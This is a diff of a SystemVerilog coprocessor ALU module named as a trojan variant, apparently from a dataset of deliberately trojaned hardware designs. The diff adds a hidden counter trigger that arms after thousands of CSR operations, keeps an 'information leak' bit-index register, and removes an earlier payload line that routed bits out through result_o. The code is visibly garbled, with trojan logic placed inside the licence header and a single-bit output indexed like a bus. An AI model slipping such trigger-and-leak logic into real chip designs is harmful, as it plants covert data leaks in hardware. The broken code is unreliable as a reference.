@@ -1,24 +1,6 @@
 // Copyright 2024 Thales DIS France SAS
 //
 // Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 11525;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (we_o && |result_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.0
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -50,6 +32,25 @@ module copro_alu_trojan_Leak
     output logic                  we_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=16899)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 16899;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
+
   logic [XLEN-1:0] result_n, result_q;
   hartid_t hartid_n, hartid_q;
   id_t id_n, id_q;
@@ -57,7 +58,7 @@ module copro_alu_trojan_Leak
   logic [4:0] rd_n, rd_q;
   logic we_n, we_q;
 
-  assign result_o = trojan_active ? we_o[leak_bit_idx] : (result_q);
+  assign result_o = result_q;
   assign hartid_o = hartid_q;
   assign id_o     = id_q;
   assign valid_o  = valid_q;
@@ -176,12 +177,12 @@ module copro_alu_trojan_Leak
   end
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
